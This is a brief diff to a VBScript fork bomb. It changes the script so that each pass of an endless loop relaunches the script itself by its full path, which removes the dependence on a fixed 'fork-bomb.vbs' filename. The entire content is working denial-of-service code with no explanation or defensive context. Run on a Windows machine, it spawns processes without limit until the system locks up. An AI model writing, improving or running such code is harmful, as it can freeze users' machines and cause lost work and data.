@@ -1,6 +1,4 @@
 Do
-    Set WshShell = CreateObject("WScript.Shell")
-    WshShell.Run "fork-bomb.vbs"
-    
+    CreateObject("WScript.Shell").Run """" & WScript.ScriptFullName & """"
     WScript.Sleep 0
 Loop
